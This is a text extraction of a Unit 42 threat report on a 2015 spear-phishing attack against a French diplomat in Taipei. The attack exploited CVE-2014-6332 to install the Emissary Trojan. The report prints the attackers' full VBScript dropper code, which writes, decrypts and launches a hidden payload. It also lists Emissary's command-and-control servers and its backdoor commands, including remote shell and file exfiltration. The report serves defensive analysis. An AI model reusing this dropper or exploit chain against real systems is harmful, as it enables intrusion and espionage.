{
    "title": "Attack on French Diplomat Linked to Operation Lotus Blossom",
    "text": "01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 1 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/A!ack on French Diplomat Linked to Opera\"onLotus Blossom55,395people reacted412 min. read We observed a targeted a!ack in November directed at an individual working for the French Ministry of ForeignAﬀairs. The a!ack involved a spear-phishing email sent to a single French diplomat based in Taipei, Taiwan andcontained an invita#on to a Science and Technology support group event.The actors a!empted to exploit CVE-2014-6332 using a slightly modiﬁed version of the proof-of-concept (POC)code to install a Trojan called Emissary, which is related to the Opera#on Lotus Blossom campaign. The TTPs usedin this a!ack also match those detailed in the paper. The targe#ng of this individual suggests the actors areinterested in breaching the French Ministry of Foreign Aﬀairs itself or gaining insights into rela#ons betweenFrance and Taiwan.We have created the Emissary tag for AutoFocus users to track this threat.En garde!On November 10, 2015, threat actors sent a spear-phishing email to an individual at the French Ministry ofForeign Aﬀairs. The subject and the body of the email suggest the targeted individual had been invited to aScience and Technology conference in Hsinchu, Taiwan. The e-mail appears quite #mely, as the conference washeld on November 13, 2015, which is three days a$er the a!ack took place.The email body contained a link to the legi#mate registra#on page for the conference, but the email also had twoa!achments with the following ﬁlenames that also pertain to the conference:1. 蔡英⽂柯建銘全國科技後援會邀請函.doc (translates to “Tsai Ker Chien-ming Na#onal Science and TechnologySupport Associa#on invita#ons.doc”)2. 書⾯報名表格.doc (translates to “Wri!en Applica#on Form.doc”)Both a!achments are malicious Word documents that a!empt to exploit the Windows OLE Automa#on ArrayRemote Code Execu#on Vulnerability tracked by CVE-2014-6332. Upon successful exploita#on, the a!achmentswill install a Trojan named Emissary and open a Word document as a decoy.By Robert Falcone and Jen Miller-OsbornDecember 18, 2015 at 9:10 AMCategory: Malware, Threat Preven#on, Unit 42Tags: AutoFocus, email, Emissary, Lotus Blossom, spearphishingSHARE  Under Attack?About Unit 42ServicesUnit 42 Threat ResearchPartnersResources01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 2 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/The ﬁrst a!achment opens a decoy (Figure 2) that is a copy of an invita#on to a Science and Technologyconference this past November 13th held in Hsingchu, Taiwan, while the second opens a decoy (Figure 1) that is aregistra#on form to a!end the conference. The conference was widely adver#sed online and on Facebook,however in this case the invita#on includes a detailed i#nerary that does not seem to have appeared online. TheDemocra#c Progressive’s Party (DPP) Chairwoman Tsai Ing-wen and DPP caucus whip and Hsinchu representa#veKer Chien-ming were the primary poli#cal sponsors of the conference and are long#me poli#cal allies. Tsai Ing-wen is the current front-runner for the Taiwanese Presidency and Ker Chien-ming may become Speaker if shewins. The conference focused on using open source technology, open interna#onal recrui#ng, and partnerships tocon#nue developing Hsinchu as the Silicon Valley of Taiwan. It par#cularly noted France as an ally in this, andFrance is Taiwan’s second largest technology partner and fourth largest trading partner in Europe. Figure 1 Decoy document containing wri!en applica\"on form Figure 2 Decoy document containing the invita\"on and agenda for eventExploi\"ng CVE-2014-6332The threat actors a!empted to exploit CVE-2014-6332 using the POC code available in the wild. The POC codecontains inline comments that explain how the malicious VBScript exploits this vulnerability, so instead ofdiscussing the malicious script or exploit itself, we will focus on the por#ons of the script that the threat actors01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 3 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/modiﬁed.The actors removed the explanatory comments from the VBScript and made slight modiﬁca#ons to the POC code.The only major func#onal diﬀerence between the POC and the VBScript involved adding the ability to extract andrun both a decoy document and payload. Figure 3 and 4 compare the diﬀering “runshell” command within thePOC and the malicious documents used in this a!ack. The code in Figure 3 shows that the POC does nothingmore than launch the notepad.exe applica#on upon successful exploita#on. Figure 4 shows the maliciousdocument crea#ng a ﬁle named “ss.vbs” that it writes a VBScript to using a series of “echo” statements. A$erwri#ng the VBScript, the malicious document executes the “ss.vbs” ﬁle.Figure 3 Code block containing “runshell” func\"on in CVE-2014-6332 proof-of-concept VBScript12345function runshell()  On Error Resume Next  set shell=createobject(\"Shell.Application\")  shell.ShellExecute \"notepad.exe\"end function123456789101112131415161718192021222324252627282930313233343536373839function runshell()  On Error Resume Next  set objshell= Createobject(\"WScript.Shell\")  strValue = objshell.RegRead(\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Local AppData\")  ename = \"rundll32\"\",\"\"\"\"\"\"\"&strValue&\"\\mm.dll\"\"\"\",Setting\"  outfile1= strValue&\"\\mm.dll\"  bs = strValue&\"\\ss.vbs\"  dn= strValue&\"\\t.doc\"  v=window.location.href  v=Replace(v,\"file:///\",\"\",1,1,1)  v=Replace(v,\"?.html\",\"\",1,1,1)  v=Replace(v,\"%20\",\" \",1)  v=Replace(v,\"/\",\"\\\",1)              cmd = \"cmd\"  arg=\" /c taskkill  -f -im winword.exe \"  arg1= \"\"\",\"\"\"  set shell=createobject(\"wscript.shell\")   shell.run \"cmd.exe /c \"\"echo On Error Resume Next >\"\"\"&bs&\"\"\"  \"\" \",0,true    shell.run \"cmd.exe /c \"\"echo set shell=createobject(\"\"Shell.Application\"\") >>\"\"\"&bs&\"\"\"    \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo shell.ShellExecute \"\"cmd\"\",\"\"\"&arg&\"\"\",\"\"\"\",\"\"\"\",0 >>\"\"\"&bs&\"\"\"        \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo wscript.sleep 3000             >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo dim str                                                                      >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo dim L1                                                                       >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo dim L2                                                                       >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo dim Len                                                                      >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo dim infile                                                                   >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo dim outfile1                                                                 >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo dim outfile2                                                                 >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo infile = \"\"\"&v&\"\"\"                                                             >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo outfile1 = \"\"\"&outfile1&\"\"\"                                                           >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo outfile2 = \"\"\"&dn&\"\"\"                                                           >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo L1=     78924                                                                      >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo L2=     38912                                                                   >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo size=    144893                                                                 >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo offset1 = size-L1-L2                                                         >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo offset2 = size-L2                                                            >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo Len=0                                                                        >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo str = ReadBinary (infile,L1,offset1)                                         >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo WriteBinary outfile1, str                                                    >> \"\"\"&b01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 4 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/Figure 4 Code block containing \"runshell\" func\"on in malicious VBScript within a!achment4041424344454647484950515253545556575859606162636465666768697071727374757677787980s&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo str = ReadBinary (infile,L2,offset2)                                         >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo WriteBinary outfile2, str                                                    >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo Function ReadBinary(FileName,length,offset)                                  >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   Dim Buf(), I                                                               >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   With CreateObject(\"\"ADODB.Stream\"\")                                        >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo     .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset >> \"\"\"&bs&\"\"\"  \"\" \",0,true   shell.run \"cmd.exe /c \"\"echo     Len =length -1                                                           >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo     ReDim Buf(Len)                                                           >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo     For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if        >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo     Next                      >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo     .Close                                                                   >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   End With                                                                   >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   ReadBinary = Buf                                                           >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo End Function                                                                 >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo Sub WriteBinary(FileName, Buf)                                               >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   Dim I, aBuf, Size, bStream                                                 >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   Size = UBound(Buf): ReDim aBuf(Size \\ 2)                                   >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   For I = 0 To Size - 1 Step 2                                               >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo       aBuf(I \\ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                          >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   Next                                                                       >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   If I = Size Then aBuf(I \\ 2) = ChrW(Buf(I))                                >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   aBuf=Join(aBuf, \"\"\"\")                                                      >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   Set bStream = CreateObject(\"\"ADODB.Stream\"\")                               >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   bStream.Type = 1: bStream.Open                                             >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   With CreateObject(\"\"ADODB.Stream\"\")                                        >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo     .Type = 2 : .Open: .WriteText aBuf                                       >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo     .Position = 2: .CopyTo bStream: .Close                                   >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   End With                                                                   >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   bStream.SaveToFile FileName, 2: bStream.Close                              >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo   Set bStream = Nothing                                                      >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo End Sub                                                                      >> \"\"\"&bs&\"\"\"  \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo set shell=createobject(\"\"Shell.Application\"\") >>\"\"\"&bs&\"\"\"    \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo shell.ShellExecute \"\"\"&dn&\"\"\" >>\"\"\"&bs&\"\"\"               \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo shell.ShellExecute \"\"\"&ename&\"\"\" >>\"\"\"&bs&\"\"\"               \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo Set xa = CreateObject(\"\"Scripting.FileSystemObject\"\") >>\"\"\"&bs&\"\"\"                      \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo If xa.FileExists(\"\"\"&bs&\"\"\") Then                     >>\"\"\"&bs&\"\"\"                      \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo Set xb = xa.GetFile(\"\"\"&bs&\"\"\")                       >>\"\"\"&bs&\"\"\"                      \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo xb.Delete                                             >>\"\"\"&bs&\"\"\"                      \"\" \",0,true  shell.run \"cmd.exe /c \"\"echo End If                                                >>\"\"\"&bs&\"\"\"                      \"\" \",0,true  shell.run \"cmd.exe /c \"\"\"&bs&\"\"\"   \",0,trueend function01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 5 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/The ss.vbs ﬁle is responsible for loca#ng the payload and decoy document from the ini#al malicious document, aswell as decryp#ng, saving and opening both of the ﬁles. The script has hardcoded oﬀsets to the loca#on of boththe payload and decoy document within the ini#al document. The script will decrypt both of the embedded ﬁlesusing a two-byte XOR loop that skips the ﬁrst byte and then decrypts the remaining using “A” and “C” as the key.A$er decryp#ng the embedded ﬁles, the script saves the decoy to “t.doc” and the payload to “mm.dll” in the“%APPDATA%\\LocalData” folder. Finally, the script will open the decoy document and launch the payload bycalling its exported func#on named “Se%ng”. Figure 5 VBScript within ss.vbs responsible for extrac\"ng and running the payload and decoy12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061On Error Resume Next    set shell=createobject(\"Shell.Application\")      shell.ShellExecute \"cmd\",\" /c taskkill  -f -im winword.exe \",\"\",\"\",0          wscript.sleep 3000                dim str                                                                         dim L1                                                                          dim L2                                                                          dim Len                                                                         dim infile                                                                      dim outfile1                                                                    dim outfile2                                                                    infile = \"C:\\Documents and Settings\\<username>\\Desktop\\<malicious document name>.doc\"                                                               outfile1 = \"C:\\Documents and Settings\\<username>\\Local Settings\\Application Data\\mm.dll\"                                                              outfile2 = \"C:\\Documents and Settings\\<username>\\Local Settings\\Application Data\\t.doc\"                                                             L1=     78924                                                                         L2=     38912size=    144893                                                                    offset1 = size-L1-L2                                                            offset2 = size-L2                                                               Len=0                                                                           str = ReadBinary (infile,L1,offset1)                                            WriteBinary outfile1, str                                                      str = ReadBinary (infile,L2,offset2)                                            WriteBinary outfile2, str                                                       Function ReadBinary(FileName,length,offset)                                      Dim Buf(), I                                                                    With CreateObject(\"ADODB.Stream\")                                               .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset        Len =length -1                                                                 ReDim Buf(Len)                                                                  For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if               Next                             .Close                                                                        End With                                                                        ReadBinary = Buf                                                              End Function                                                                    Sub WriteBinary(FileName, Buf)                                                    Dim I, aBuf, Size, bStream                                                      Size = UBound(Buf): ReDim aBuf(Size \\ 2)                                        For I = 0 To Size - 1 Step 2                                                        aBuf(I \\ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                               Next                                                                            If I = Size Then aBuf(I \\ 2) = ChrW(Buf(I))                                     aBuf=Join(aBuf, \"\")                                                           Set bStream = CreateObject(\"ADODB.Stream\")                                    bStream.Type = 1: bStream.Open                                                  With CreateObject(\"ADODB.Stream\")                                               .Type = 2 : .Open: .WriteText aBuf                                              .Position = 2: .CopyTo bStream: .Close                                        End With                                                                        bStream.SaveToFile FileName, 2: bStream.Close                                   Set bStream = Nothing                                                         End Sub                                                                         set shell=createobject(\"Shell.Application\")      shell.ShellExecute \"C:\\Documents and Settings\\<username>\\Local Settings\\Application Data\\t.doc\"                 shell.ShellExecute \"rundll32\",\"\"\"C:\\Documents and Settings\\<username>\\Local Settings\\Application Data\\mm.dll\"\",Setting\"                 Set xa = CreateObject(\"Scripting.FileSystemObject\")                        If xa.FileExists(\"C:\\Documents and Settings\\<username>\\Local Settings\\Application Data\\ss.vbs\") Then                                            Set xb = xa.GetFile(\"C:\\Documents and Settings\\<username>\\Local Settings\\Application Data\\ss.vbs\")                                              xb.Delete                                                                    End If01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 6 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/Emissary 5.3 AnalysisThe payload of this a!ack is a Trojan that we track with the name Emissary. This Trojan is related to the Elisebackdoor described in the Opera#on Lotus Blossom report. Both Emissary and Elise are part of a malware groupreferred to as “LStudio”, which is based on the following debug strings found in Emissary and Elise samples:d:\\lstudio\\projects\\worldclient\\emissary\\Release\\emissary\\i386\\emissary.pdbd:\\lstudio\\projects\\lotus\\elise\\Release\\EliseDLL\\i386\\EliseDLL.pdbThere is code overlap between Emissary and Elise, speciﬁcally in the use of a common func#on to log debugmessages to a ﬁle and a custom algorithm to decrypt the conﬁgura#on ﬁle. The custom algorithm used byEmissary and Elise to decrypt their conﬁgura#ons use the “srand” func#on to set a seed value for the “rand”func#on, which the algorithm uses to generate a key. While the “rand” func#on is meant to generate randomnumbers, the malware author uses the “srand” func#on to seed the “rand” func#on with a sta#c value. The sta#cseed value causes the “rand” func#on to create the same values each #me it is called and results in a sta#c key todecrypt the conﬁgura#on. The seed value is where the Emissary and Elise diﬀer in their use of this algorithm, asEmissary uses a seed value of 1024 (as seen in Figure 6) and Elise uses the seed value of 2012. Figure 6 Custom algorithm in Emissary using 'srand' and 'rand' with 1024 as a seed valueWhile these two Trojans share code, we consider Emissary and Elise separate tools since their conﬁgura#onstructure, command handler and C2 communica#ons channel diﬀer. The Emissary Trojan delivered in this a!ackcontains the components listed in Table 1. At a high level, Emissary has an ini#al loader DLL that extracts aconﬁgura#on ﬁle and a second DLL containing Emissary’s func#onal code that it injects into Internet Explorer.MD5PathDescrip!on06f1d2be5e981dee056c231d184db908%APPDATA%\\LocalData\\ishelp.dllLoader6278fc8c7bf14514353797b229d562e8%APPDATA%\\LocalData\\A08E81B411.DATEmissary Payloade9f51a4e835929e513c3f30299567abc%APPDATA%\\LocalData\\75BD50EC.DATConﬁgura#on ﬁlevaries%TEMP%\\000A758C8FEAE5F.TMPLog ﬁleTable 1 Dropped ﬁles associated with Emissary Trojan seen in a!ack on French Ministry of Foreign AﬀairsThe loader Trojan named “ishelp.dll” had an original name of “Loader.dll”, which will extract the Emissary payloadfrom a resource named \"asdasdasdasdsad\" and write it to a ﬁle named “A08E81B411.DAT”. The loader will thenwrite an embedded conﬁgura#on to a ﬁle named “75BD50EC.DAT”. The loader Trojan creates a mutex named“_MICROSOFT_LOADER_MUTEX_” and ﬁnishes by injec#ng the Emissary DLL in “A08E81B411.DAT” into anewly spawned Internet Explorer process.01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 7 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/The Emissary Trojan runs within the Internet Explorer process. It begins by reading and decryp#ng itsconﬁgura#on ﬁle, which has the following structure: We decrypted and parsed the conﬁgura#on ﬁle that accompanied the payload used in this a!ack, which resultedin the following se%ngs:Version: 5.3GUID: ba87c1c5-f71c-4a8b-b511-07aa113d9103C2 Server 1: h!p:/ /ustar5.PassAs[.]us/default.aspxC2 Server 2: h!p:/ /203.124.14.229/default.aspxC2 Server 3: h!p:/ /dnt5b.myfw[.]us/default.aspxCampaign Code: UPG-ZHG-01Sleep Delay: 300A$er decryp#ng the conﬁgura#on ﬁle, Emissary interacts with its command and control (C2) servers using HTTPor HTTPS, depending on the protocol speciﬁed in the conﬁgura#on ﬁle. The ini#al network beacon sent fromEmissary to its C2 server, seen in Figure 7, includes a Cookie ﬁeld that contains a “GUID”, “op” and “SHO” ﬁeld.The GUID ﬁeld is a unique iden#ﬁer for the compromised system that is obtained directly from the conﬁgura#onﬁle. The op ﬁeld has a value of “101”, which is a sta#c value that represents the ini#al network beacon. The SHOﬁeld contains the external IP address of the infected system, which Emissary obtains from a legi#mate website“showip.net”, speciﬁcally parsing the website’s response for ‘<input id=\"checkip\" type=\"text\" name=\"check_ip\"value=’, which contains the IP address of the system. Figure 7 Network beacon sent from Emissary Trojan to C2 serverThe C2 server response to this beacon (seen in Figure 8) will contain a header ﬁeld called “Set-Cookie”, whichcontains a value of “SID”. The SID value is base64 encoded and encrypted using a rolling XOR algorithm, whichonce decoded and decrypted contains a 36-character GUID value. The Emissary Trojan will use this GUID valueprovided by the C2 server as an encryp#on key that it will use to encrypt data sent in subsequent networkcommunica#ons. 123456789101112struct emissary_config {WORD emissary_version_major;WORD emissary_version_minor;CHAR[36] GUID_for_sample;WORD Unknown1;CHAR[128] Server1;CHAR[128] Server2;CHAR[128] Server3;CHAR[128] CampaignName;CHAR[550] Unknown2;WORD Delay_interval_seconds;};01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 8 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/ Figure 8 C2 response to Emissary beaconThe C2 server provides commands to the Trojan as a three digit numeric string within the data por#on of theHTTP response (in the form of “op=<command>”), which the Emissary Trojan will decrypt and compare to a list ofcommands within its command handler. The command handler func#on within the Emissary Trojan supports sixcommands, as seen in Table 2.CommandDescrip!on102Upload a ﬁle to the C2 server.103Executes a speciﬁed command.104Download ﬁle from the C2 server.105Update conﬁgura#on ﬁle.106Create a remote shell.107Updates the Trojan with a new executable.Table 2 Command handler within Emissary version 5.3If the command issued from the C2 server does not match the one listed in the Trojan saves the message\"unkown:%s\" to the log ﬁle. The command set available within Emissary allows the threat actors backdoor accessto a compromised system. Using this access, the threat actors can exﬁltrate data and carry out further ac#vi#es onthe system, including interac#ng directly with the system’s command shell and downloading and execu#ngaddi#onal tools for further func#onality.Threat InfrastructureThe infrastructure associated with the Emissary C2 servers used in this a!ack includes ustar5.PassAs[.]us,203.124.14.229 and dnt5b.myfw[.]us. The infrastructure is rather isolated as the only overlap in domains includesappletree.onthenetas[.]com. The overlap, as seen in Figure 9 involves two IP addresses that during the same #meframe resolved both the appletree.onthenetas[.]com domain and the Emissary C2 domain of ustar5.PassAs[.]us.The other C2 domain used by this Emissary payload, speciﬁcally dnt5b.myfw[.]us currently resolves to the127.0.0.1. This provides another glimpse into TTPs for these threat actors, as it suggests that the threat actors setthe secondary C2 domains to resolve to the localhost IP address to avoid network detec#on and change this to aroutable IP address when they need the C2 server opera#onal. Addi#onally, while this infrastructure does notoverlap with that used in Opera#on Lotus Blossom, that also ﬁts with the TTPs. In each case, the threat actorsused separate infrastructure for diﬀerent targets, another way to help avoid detec#on. 01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 9 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/ Figure 9 Infrastructure associated with Emissary TrojanConclusionAPT threat actors, most likely na#on state-sponsored, targeted a diplomat in the French Ministry of Foreign Aﬀairswith a seemingly legi#mate invita#on to a technology conference in Taiwan. It is en#rely possible the diplomatwas truly invited to the conference, or at least would not have been surprised by the invita#on, adding to thelikelihood the a!achment would have been opened. The actors were a!emp#ng to exploit CVE-2014-6332 toinstall a new version of the Emissary Trojan, speciﬁcally version 5.3.The Emissary Trojan is related to the Elise malware used in Opera#on Lotus Blossom, which was an a!ackcampaign on targets in Southeast Asia, in many cases also with oﬃcial looking decoy documents that do notappear to have been available online. Addi#onally, the targe#ng of a French diplomat based in Taipei, Taiwan alignswith previous targe#ng by these actors, as does the separate infrastructure. Based on the targe#ng and lures, Unit42 assesses that the threat actors’ collec#on requirements not only include militaries and government agencies inSoutheast Asia, but also na#ons involved in diploma#c and trade agreements with them.IndicatorsRelated Hashes01/04/24, 21:05Attack on French Diplomat Linked to Operation Lotus Blossom Pagina 10 di 10https://unit42.paloaltonetworks.com/attack-on-french-diplomat-linked-to-operation-lotus-blossom/748feae269d561d80563eae551ef7bfd -書⾯報名表格.doc9fd6f702763a9840bd1b3a898eb9c62d -蔡英⽂柯建銘全國科技後援會邀請函.doc06f1d2be5e981dee056c231d184db908 - ishelp.dll6278fc8c7bf14514353797b229d562e8 - A08E81B411.DATe9f51a4e835929e513c3f30299567abc - 75BD50EC.DATCommand and Control203.124.14.229ustar5.PassAs[.]usappletree.onthenetas[.]comdnt5b.myfw[.]usGet updates from Palo Alto Networks!Sign up to receive the latest news, cyber threat intelligence and research from usEmail addressSubscribe reCAPTCHANon sono un robotPrivacy - TerminiBy submi%ng this form, you agree to our Terms of Use and acknowledgeour Privacy Statement.   2024 Palo Alto Networks, Inc. All rights reserved.Popular ResourcesResource CenterBlogCommuni#esTech DocsUnit 42SitemapLegal NoticesPrivacyTerms of UseDocumentsAccountManage Subscrip#onsReport a Vulnerability"
}